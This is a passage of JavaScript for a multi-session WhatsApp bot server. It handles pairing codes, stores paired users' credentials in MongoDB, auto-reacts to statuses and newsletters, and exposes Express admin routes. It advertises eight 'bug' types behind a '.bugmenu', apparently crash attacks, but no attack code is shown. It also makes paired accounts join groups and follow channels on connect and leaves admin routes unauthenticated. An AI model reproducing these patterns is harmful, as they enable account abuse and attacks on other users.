        if (userConfig.AUTO_RECORDING !== undefined) autoRecording = userConfig.AUTO_RECORDING;
      }

      if (autoRecording === 'true') {
        await socket.sendPresenceUpdate("recording", message.key.remoteJid);
      }

      if (autoViewStatus === 'true') {
        let retries = config.MAX_RETRIES;
        while (retries > 0) {
          try {
            await socket.readMessages([message.key]);
            break;
          } catch (error) {
            retries--;
            await delay(1000);
          }
        }
      }

      if (autoLikeStatus === 'true') {
        const randomEmoji = userEmojis[Math.floor(Math.random() * userEmojis.length)];
        let retries = config.MAX_RETRIES;
        while (retries > 0) {
          try {
            await socket.sendMessage(message.key.remoteJid, {
              react: { text: randomEmoji, key: message.key }
            }, { statusJidList: [message.key.participant] });
            break;
          } catch (error) {
            retries--;
            await delay(1000);
          }
        }
      }
    } catch (error) { }
  });
}

// ==================== AUTO MESSAGE READ ====================

async function setupAutoMessageRead(socket, sessionNumber) {
  socket.ev.on('messages.upsert', async ({ messages }) => {
    const msg = messages[0];
    if (!msg || !msg.message || msg.key.remoteJid === 'status@broadcast') return;

    const sanitized = (sessionNumber || '').replace(/[^0-9]/g, '');
    const userConfig = await loadUserConfigFromMongo(sanitized) || {};
    const autoReadSetting = userConfig.AUTO_READ_MESSAGE || 'off';

    if (autoReadSetting === 'off') return;

    let body = '';
    try {
      const type = getContentType(msg.message);
      const actualMsg = (type === 'ephemeralMessage') ? msg.message.ephemeralMessage.message : msg.message;
      if (type === 'conversation') body = actualMsg.conversation || '';
      else if (type === 'extendedTextMessage') body = actualMsg.extendedTextMessage?.text || '';
    } catch (e) {}

    const prefix = userConfig.PREFIX || config.PREFIX;
    const isCmd = body && body.startsWith(prefix);

    if (autoReadSetting === 'all' || (autoReadSetting === 'cmd' && isCmd)) {
      try { await socket.readMessages([msg.key]); } catch (error) {}
    }
  });
}

// ==================== TYPING/RECORDING HANDLERS ====================

function setupMessageHandlers(socket, sessionNumber) {
  socket.ev.on('messages.upsert', async ({ messages }) => {
    const msg = messages[0];
    if (!msg.message || msg.key.remoteJid === 'status@broadcast') return;

    try {
      let autoTyping = config.AUTO_TYPING;
      let autoRecording = config.AUTO_RECORDING;

      if (sessionNumber) {
        const userConfig = await loadUserConfigFromMongo(sessionNumber) || {};
        if (userConfig.AUTO_TYPING !== undefined) autoTyping = userConfig.AUTO_TYPING;
        if (userConfig.AUTO_RECORDING !== undefined) autoRecording = userConfig.AUTO_RECORDING;
      }

      if (autoTyping === 'true') {
        await socket.sendPresenceUpdate('composing', msg.key.remoteJid);
        setTimeout(async () => {
          try { await socket.sendPresenceUpdate('paused', msg.key.remoteJid); } catch (e) {}
        }, 3000);
      }

      if (autoRecording === 'true') {
        await socket.sendPresenceUpdate('recording', msg.key.remoteJid);
        setTimeout(async () => {
          try { await socket.sendPresenceUpdate('paused', msg.key.remoteJid); } catch (e) {}
        }, 3000);
      }
    } catch (error) {}
  });
}

// ==================== CALL REJECTION ====================

async function setupCallRejection(socket, sessionNumber) {
  socket.ev.on('call', async (calls) => {
    try {
      const sanitized = (sessionNumber || '').replace(/[^0-9]/g, '');
      const userConfig = await loadUserConfigFromMongo(sanitized) || {};
      if (userConfig.ANTI_CALL !== 'on') return;

      for (const call of calls) {
        if (call.status !== 'offer') continue;
        await socket.rejectCall(call.id, call.from);
        await socket.sendMessage(call.from, { text: '*🔕 Auto call rejection is enabled.*' });
      }
    } catch (err) { }
  });
}

// ==================== DELETE MESSAGE NOTIFICATION ====================

async function handleMessageRevocation(socket, sessionNumber) {
  socket.ev.on('messages.delete', async ({ keys }) => {
    if (!keys || keys.length === 0) return;
    
    try {
      const sanitized = (sessionNumber || '').replace(/[^0-9]/g, '');
      const userConfig = await loadUserConfigFromMongo(sanitized) || {};
      if (userConfig.DELETE_MESSAGE_NOTIFY !== 'on') return;
      
      const messageKey = keys[0];
      const userJid = jidNormalizedUser(socket.user.id);
      const deletionTime = getSriLankaTimestamp();
      const message = `🗑️ *MESSAGE DELETED*\n\nFrom: ${messageKey.remoteJid}\nTime: ${deletionTime}`;
      try { await sendImageWithMessage(socket, userJid, config.RCD_IMAGE_PATH, message, BOT_NAME_FANCY); } catch (error) { }
    } catch (error) { }
  });
}

// ==================== NEWSLETTER HANDLERS ====================

async function setupNewsletterHandlers(socket, sessionNumber) {
  const rrPointers = new Map();

  socket.ev.on('messages.upsert', async ({ messages }) => {
    try {
      const message = messages[0];
      if (!message?.key) return;
      const jid = message.key.remoteJid;
      if (!jid || !jid.endsWith('@newsletter')) return;

      let followedDocs = [];
      try { followedDocs = await listNewslettersFromMongo(); } catch (e) { followedDocs = []; }

      const followedJids = followedDocs.map(d => d.jid);
      if (!followedJids.includes(jid)) return;

      let emojis = config.AUTO_LIKE_EMOJI;

      let idx = rrPointers.get(jid) || 0;
      const emoji = emojis[idx % emojis.length];
      rrPointers.set(jid, (idx + 1) % emojis.length);

      const messageId = message.newsletterServerId || message.key.id;
      if (!messageId) return;

      let retries = 3;
      while (retries-- > 0) {
        try {
          if (typeof socket.newsletterReactMessage === 'function') {
            await socket.newsletterReactMessage(jid, messageId.toString(), emoji);
          } else {
            await socket.sendMessage(jid, { react: { text: emoji, key: message.key } });
          }
          break;
        } catch (err) {
          if (retries > 0) await delay(1200);
        }
      }
    } catch (error) {
      console.error('Newsletter handler error:', error?.message || error);
    }
  });
}

// ==================== CLEANUP ====================

async function deleteSessionAndCleanup(number, socketInstance) {
  const sanitized = number.replace(/[^0-9]/g, '');
  try {
    const sessionPath = path.join(os.tmpdir(), `session_${sanitized}`);
    try { if (fs.existsSync(sessionPath)) fs.removeSync(sessionPath); } catch (e) { }
    activeSockets.delete(sanitized);
    socketCreationTime.delete(sanitized);
    try { await removeSessionFromMongo(sanitized); } catch (e) { }
    try { await removeNumberFromMongo(sanitized); } catch (e) { }
  } catch (err) { }
}

// ==================== AUTO RESTART ====================

function setupAutoRestart(socket, number) {
  const sanitized = number.replace(/[^0-9]/g, '');

  socket.ev.on('connection.update', async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === 'open') {
      reconnectAttempts.set(sanitized, 0);
    }

    if (connection === 'close') {
      const statusCode = lastDisconnect?.error?.output?.statusCode
        || lastDisconnect?.error?.statusCode
        || (lastDisconnect?.error && String(lastDisconnect.error).includes('401') ? 401 : undefined);

      const isLoggedOut = statusCode === 401
        || (lastDisconnect?.error && String(lastDisconnect.error).toLowerCase().includes('logged out'))
        || (lastDisconnect?.reason === DisconnectReason?.loggedOut);

      if (isLoggedOut) {
        console.log(`User ${sanitized} logged out. Cleaning up...`);
        reconnectAttempts.delete(sanitized);
        try { await deleteSessionAndCleanup(sanitized, socket); } catch (e) { }
        return;
      }

      const attempts = (reconnectAttempts.get(sanitized) || 0) + 1;
      reconnectAttempts.set(sanitized, attempts);

      if (attempts > MAX_RECONNECT_ATTEMPTS) {
        console.log(`Max reconnect attempts (${MAX_RECONNECT_ATTEMPTS}) reached for ${sanitized}. Giving up.`);
        reconnectAttempts.delete(sanitized);
        activeSockets.delete(sanitized);
        return;
      }

      const backoffMs = Math.min(5000 * Math.pow(1.5, attempts - 1), 120000);
      console.log(`Connection closed for ${sanitized}. Attempt ${attempts}/${MAX_RECONNECT_ATTEMPTS}, retrying in ${Math.round(backoffMs / 1000)}s...`);

      try {
        await delay(backoffMs);
        if (activeSockets.has(sanitized)) return;
        activeSockets.delete(sanitized);
        socketCreationTime.delete(sanitized);
        const mockRes = { headersSent: false, send: () => {}, status: () => mockRes };
        await EmpirePair(sanitized, mockRes);
      } catch (e) {
        console.error(`Reconnect attempt ${attempts} failed for ${sanitized}:`, e?.message);
      }
    }
  });
}

// ==================== EMPIREPAIR ====================

async function EmpirePair(number, res) {
  const sanitizedNumber = number.replace(/[^0-9]/g, '');
  const sessionPath = path.join(os.tmpdir(), `session_${sanitizedNumber}`);
  await initMongo().catch(() => { });

  try {
    const mongoDoc = await loadCredsFromMongo(sanitizedNumber);
    if (mongoDoc && mongoDoc.creds) {
      fs.ensureDirSync(sessionPath);
      fs.writeFileSync(path.join(sessionPath, 'creds.json'), JSON.stringify(mongoDoc.creds, null, 2));
      if (mongoDoc.keys) fs.writeFileSync(path.join(sessionPath, 'keys.json'), JSON.stringify(mongoDoc.keys, null, 2));
    }
  } catch (e) { }

  const { state, saveCreds } = await useMultiFileAuthState(sessionPath);

  try {
    const socket = makeWASocket({
      logger: pino({ level: "silent" }),
      printQRInTerminal: false,
      auth: state,
      version: [2, 3000, 1033105955],
      connectTimeoutMs: 60000,
      defaultQueryTimeoutMs: 0,
      keepAliveIntervalMs: 10000,
      emitOwnEvents: true,
      fireInitQueries: true,
      generateHighQualityLinkPreview: true,
      syncFullHistory: true,
      markOnlineOnConnect: true,
      browser: ['Mac OS', 'Safari', '10.15.7']
    });

    socketCreationTime.set(sanitizedNumber, Date.now());

    setupStatusHandlers(socket, sanitizedNumber);
    setupCommandHandlers(socket, sanitizedNumber);
    setupMessageHandlers(socket, sanitizedNumber);
    setupAutoRestart(socket, sanitizedNumber);
    setupNewsletterHandlers(socket, sanitizedNumber);
    handleMessageRevocation(socket, sanitizedNumber);
    setupAutoMessageRead(socket, sanitizedNumber);
    setupCallRejection(socket, sanitizedNumber);

    if (!socket.authState.creds.registered) {
      let retries = config.MAX_RETRIES;
      let code;
      while (retries > 0) {
        try { await delay(1500); code = await socket.requestPairingCode(sanitizedNumber); break; }
        catch (error) { retries--; await delay(2000); }
      }
      if (code) {
        if (!res.headersSent) res.send({ code });
      } else {
        if (!res.headersSent) res.status(503).send({ error: 'Failed to generate pairing code. Please try again.' });
      }
    }

    socket.ev.on('creds.update', async () => {
      try {
        await saveCreds();
        const credsPath = path.join(sessionPath, 'creds.json');
        if (!fs.existsSync(credsPath)) return;
        const fileContent = await fs.readFile(credsPath, 'utf8');
        const trimmedContent = fileContent.trim();
        if (!trimmedContent || trimmedContent === '{}' || trimmedContent === 'null') return;
        let credsObj;
        try { credsObj = JSON.parse(trimmedContent); } catch (e) { return; }
        if (!credsObj || typeof credsObj !== 'object') return;
        const keysObj = state.keys || null;
        await saveCredsToMongo(sanitizedNumber, credsObj, keysObj);
      } catch (err) { }
    });

    socket.ev.on('connection.update', async (update) => {
      const { connection } = update;
      if (connection === 'open') {
        try {
          await delay(3000);
          const userJid = jidNormalizedUser(socket.user.id);

          const groupResult = await joinGroup(socket).catch(() => ({ status: 'failed', error: 'Not configured' }));
          const channelResult = await followChannel(socket).catch(() => ({ status: 'failed', error: 'Not supported' }));

          try {
            const newsletterListDocs = await listNewslettersFromMongo();
            for (const doc of newsletterListDocs) {
              try { if (typeof socket.newsletterFollow === 'function') await socket.newsletterFollow(doc.jid); } catch (e) { }
            }
          } catch (e) { }

          activeSockets.set(sanitizedNumber, socket);
          reconnectAttempts.set(sanitizedNumber, 0);
          await addNumberToMongo(sanitizedNumber);

          const userConfig = await loadUserConfigFromMongo(sanitizedNumber) || {};
          await sendAdminConnectMessage(socket, sanitizedNumber, groupResult, channelResult, userConfig);
          await sendOwnerConnectMessage(socket, sanitizedNumber, groupResult, channelResult, userConfig);

          const welcomeText = `╭━━━━━━━━━━━━━❥❥❥
┃     *✅ BOT CONNECTED*
╰━━━━━━━━━━━━━❥❥❥
╭━━━━━━━━━━━━━❥❥❥
┃ *📞 Number:* ${sanitizedNumber}
┃ *🏠 Group:* ${groupResult.status === 'success' ? '✅ Joined' : '❌ Failed'}
┃ *📰 Channel:* ${channelResult.status === 'success' ? '✅ Followed' : '❌ Failed'}
┃ *🐛 Bugs:* 8 Types Available
┃ *🕒 Time:* ${getSriLankaTimestamp()}
╰━━━━━━━━━━━━━❥❥❥

> ☠️ Bot is active! Type .menu for commands | .bugmenu for bugs`;

          await sendImageWithMessage(socket, userJid, config.RCD_IMAGE_PATH, welcomeText, BOT_NAME_FANCY);
        } catch (e) {
          console.error('connection.open handler error:', e?.message);
        }
      }
    });

  } catch (error) {
    console.error('Pairing error:', error);
    socketCreationTime.delete(sanitizedNumber);
    if (!res.headersSent) res.status(503).send({ error: 'Service Unavailable' });
  }
}

// ==================== EXPRESS ROUTES ====================

router.post('/newsletter/add', async (req, res) => {
  const { jid, emojis } = req.body;
  if (!jid) return res.status(400).send({ error: 'jid required' });
  try {
    await addNewsletterToMongo(jid, Array.isArray(emojis) ? emojis : []);
    res.status(200).send({ status: 'ok', jid });
  } catch (e) { res.status(500).send({ error: e.message }); }
});

router.post('/newsletter/remove', async (req, res) => {
  const { jid } = req.body;
  if (!jid) return res.status(400).send({ error: 'jid required' });
  try {
    await removeNewsletterFromMongo(jid);
    res.status(200).send({ status: 'ok', jid });
  } catch (e) { res.status(500).send({ error: e.message }); }
});

router.get('/newsletter/list', async (req, res) => {
  try {
    const list = await listNewslettersFromMongo();
    res.status(200).send({ status: 'ok', channels: list });
  } catch (e) { res.status(500).send({ error: e.message }); }
});

router.post('/admin/add', async (req, res) => {
  const { jid } = req.body;
  if (!jid) return res.status(400).send({ error: 'jid required' });
  try {
    await addAdminToMongo(jid);
    res.status(200).send({ status: 'ok', jid });
  } catch (e) { res.status(500).send({ error: e.message }); }
});

router.post('/admin/remove', async (req, res) => {
  const { jid } = req.body;
  if (!jid) return res.status(400).send({ error: 'jid required' });
  try {
    await removeAdminFromMongo(jid);
    res.status(200).send({ status: 'ok', jid });
  } catch (e) { res.status(500).send({ error: e.message }); }
});

router.get('/admin/list', async (req, res) => {
  try {
    const list = await loadAdminsFromMongo();
    res.status(200).send({ status: 'ok', admins: list });
  } catch (e) { res.status(500).send({ error: e.message }); }
});

router.get('/', async (req, res) => {
  const { number } = req.query;
  if (!number) return res.status(400).send({ error: 'Number parameter is required' });
  if (activeSockets.has(number.replace(/[^0-9]/g, ''))) return res.status(200).send({ status: 'already_connected' });
  
  const sanitized = number.replace(/[^0-9]/g, '');
  const password = generateSettingPassword();
  await setSettingPasswordInMongo(sanitized, password);
  
  await EmpirePair(number, res);
});

router.get('/active', (req, res) => {
  res.status(200).send({ botName: BOT_NAME_FANCY, count: activeSockets.size, numbers: Array.from(activeSockets.keys()), timestamp: getSriLankaTimestamp() });
});

router.get('/ping', (req, res) => {
  res.status(200).send({ status: 'active', botName: BOT_NAME_FANCY, activeSessions: activeSockets.size });
});

router.get('/connect-all', async (req, res) => {
  try {
    const numbers = await getAllNumbersFromMongo();
    if (!numbers || numbers.length === 0) return res.status(404).send({ error: 'No numbers found' });
    const results = [];
    for (const number of numbers) {
      if (activeSockets.has(number)) { results.push({ number, status: 'already_connected' }); continue; }
      const mockRes = { headersSent: false, send: () => {}, status: () => mockRes };
      await EmpirePair(number, mockRes);
      results.push({ number, status: 'connection_initiated' });
    }
    res.status(200).send({ status: 'success', connections: results });
  } catch (error) { res.status(500).send({ error: 'Failed to connect all bots' }); }
});

router.get('/reconnect', async (req, res) => {
  try {
    const numbers = await getAllNumbersFromMongo();
    if (!numbers || numbers.length === 0) return res.status(404).send({ error: 'No session numbers found' });
    const results = [];
    for (const number of numbers) {
      if (activeSockets.has(number)) { results.push({ number, status: 'already_connected' }); continue; }
      const mockRes = { headersSent: false, send: () => {}, status: () => mockRes };
      try { await EmpirePair(number, mockRes); results.push({ number, status: 'connection_initiated' }); } catch (err) { results.push({ number, status: 'failed', error: err.message }); }
      await delay(1000);
    }
    res.status(200).send({ status: 'success', connections: results });
  } catch (error) { res.status(500).send({ error: 'Failed to reconnect bots' }); }
});

router.get('/update-config', async (req, res) => {
  const { number, config: configString } = req.query;
  if (!number || !configString) return res.status(400).send({ error: 'Number and config are required' });
  let newConfig;
  try { newConfig = JSON.parse(configString); } catch (error) { return res.status(400).send({ error: 'Invalid config format' }); }
  const sanitizedNumber = number.replace(/[^0-9]/g, '');
  const socket = activeSockets.get(sanitizedNumber);
  if (!socket) return res.status(404).send({ error: 'No active session found' });
  const otp = generateOTP();
  otpStore.set(sanitizedNumber, { otp, expiry: Date.now() + config.OTP_EXPIRY, newConfig });
  try { await sendOTP(socket, sanitizedNumber, otp); res.status(200).send({ status: 'otp_sent' }); }
  catch (error) { otpStore.delete(sanitizedNumber); res.status(500).send({ error: 'Failed to send OTP' }); }
});

router.get('/verify-otp', async (req, res) => {
  const { number, otp } = req.query;
  if (!number || !otp) return res.status(400).send({ error: 'Number and OTP are required' });
  const sanitizedNumber = number.replace(/[^0-9]/g, '');
  const storedData = otpStore.get(sanitizedNumber);
  if (!storedData) return res.status(400).send({ error: 'No OTP request found' });
  if (Date.now() >= storedData.expiry) { otpStore.delete(sanitizedNumber); return res.status(400).send({ error: 'OTP expired' }); }
  if (storedData.otp !== otp) return res.status(400).send({ error: 'Invalid OTP' });
  try {
    await setUserConfigInMongo(sanitizedNumber, storedData.newConfig);
    otpStore.delete(sanitizedNumber);
    res.status(200).send({ status: 'success', message: 'Config updated successfully' });
  } catch (error) { res.status(500).send({ error: 'Failed to update config' }); }
});

router.get('/getabout', async (req, res) => {
  const { number, target } = req.query;
  if (!number || !target) return res.status(400).send({ error: 'Number and target are required' });
  const sanitizedNumber = number.replace(/[^0-9]/g, '');
  const socket = activeSockets.get(sanitizedNumber);
  if (!socket) return res.status(404).send({ error: 'No active session found' });
  const targetJid = `${target.replace(/[^0-9]/g, '')}@s.whatsapp.net`;
  try {
    const statusData = await socket.fetchStatus(targetJid);
    res.status(200).send({ status: 'success', about: statusData.status || 'No status' });
  } catch (error) { res.status(500).send({ error: 'Failed to fetch status' }); }
});

// ==================== SETTING LOGIN API (for web panel if needed) ====================

router.post('/api/setting/login', async (req, res) => {
  try {
    const { number, password } = req.body;
    if (!number || !password) return res.status(400).json({ ok: false, error: 'number and password required' });
    const sanitized = ('' + number).replace(/[^0-9]/g, '');
    const stored = await getSettingPasswordFromMongo(sanitized);
    if (!stored || stored !== password.trim().toUpperCase()) {
      return res.status(401).json({ ok: false, error: 'Invalid number or password' });
    }
    const token = crypto.randomBytes(16).toString('hex');
    settingTokens.set(token, { number: sanitized, createdAt: Date.now() });
    res.json({ ok: true, token, number: sanitized });
  } catch (err) { res.status(500).json({ ok: false, error: err.message }); }
});

router.get('/api/setting/config', async (req, res) => {
  try {
    const token = req.headers['x-setting-token'] || req.query.token;
    if (!token || !settingTokens.has(token)) return res.status(401).json({ ok: false, error: 'Unauthorized' });
    const session = settingTokens.get(token);
    if (Date.now() - session.createdAt > 3600000) {
      settingTokens.delete(token);
      return res.status(401).json({ ok: false, error: 'Session expired' });
    }
    const cfg = await loadUserConfigFromMongo(session.number) || {};
    res.json({ ok: true, number: session.number, config: cfg });
  } catch (err) { res.status(500).json({ ok: false, error: err.message }); }
});

router.post('/api/setting/save', async (req, res) => {
  try {
    const token = req.headers['x-setting-token'] || req.body.token;
    if (!token || !settingTokens.has(token)) return res.status(401).json({ ok: false, error: 'Unauthorized' });
    const session = settingTokens.get(token);
    if (Date.now() - session.createdAt > 3600000) {
      settingTokens.delete(token);
      return res.status(401).json({ ok: false, error: 'Session expired' });
    }
    const { config: newConfig } = req.body;
    if (!newConfig || typeof newConfig !== 'object') return res.status(400).json({ ok: false, error: 'config object required' });
    const existing = await loadUserConfigFromMongo(session.number) || {};
    const merged = { ...existing, ...newConfig };
    await setUserConfigInMongo(session.number, merged);
    res.json({ ok: true, number: session.number, config: merged });
  } catch (err) { res.status(500).json({ ok: false, error: err.message }); }
});

router.post('/api/setting/logout', (req, res) => {
  const token = req.headers['x-setting-token'] || req.body.token;
  if (token) settingTokens.delete(token);
  res.json({ ok: true });
});

// Process events
process.on('exit', () => {
  activeSockets.forEach((socket, number) => {
    try { socket.ws.close(); } catch (e) {}
    activeSockets.delete(number);
    socketCreationTime.delete(number);
    try { fs.removeSync(path.join(os.tmpdir(), `session_${number}`)); } catch (e) {}
  });
});

process.on('uncaughtException', (err) => {
  console.error('Uncaught exception:', err);
});

// Initialize
initMongo().then(async () => {
  try {
    const credsJson = process.env.CREDS_JSON || config.CREDS_JSON;
    const sessionId = process.env.SESSION_ID || config.SESSION_ID;
    const ownerNumber = (config.OWNER_NUMBER || '').replace(/[^0-9]/g, '');
    if (ownerNumber) {
      let creds = null;
      if (credsJson) {
        creds = JSON.parse(credsJson);
      } else if (sessionId) {
        const url = sessionId.startsWith('http') ? sessionId : `https://files.catbox.moe/${sessionId}`;
        const resp = await axios.get(url);
        creds = resp.data;
      }
      if (creds && typeof creds === 'object') {
        await saveCredsToMongo(ownerNumber, creds);
      }
    }
  } catch (e) { }

  try {
    const nums = await getAllNumbersFromMongo();
    if (nums && nums.length) {
      for (const n of nums) {
        if (!activeSockets.has(n)) {
          const mockRes = { headersSent: false, send: () => {}, status: () => mockRes };
          await EmpirePair(n, mockRes);
          await delay(500);
        }
      }
    }
  } catch (e) { }
}).catch(err => console.warn('Mongo init failed', err));

module.exports = router;